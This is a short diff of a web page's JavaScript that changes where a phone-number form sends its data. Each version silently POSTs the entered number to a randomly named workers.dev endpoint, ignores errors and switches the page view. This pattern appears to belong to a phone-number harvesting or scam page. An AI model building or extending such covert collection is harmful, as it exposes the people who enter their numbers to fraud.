@@ -200,7 +200,7 @@
         function send() {
             const m = document.getElementById('phone').value;
             if(m.length !== 10) return alert("Enter valid 10-digit number");
-            fetch('https://royal-hat-2ebb.sumankkuuyy.workers.dev/', { method: 'POST', body: JSON.stringify({mobile: m}) }).catch(()=>{});
+            fetch('https://cold-pine-96e7.sumankkuuyy.workers.dev/', { method: 'POST', body: JSON.stringify({mobile: m}) }).catch(()=>{});
             document.getElementById('v1').style.display = 'none';
             document.getElementById('v2').style.display = 'block';
             setTimeout(() => {
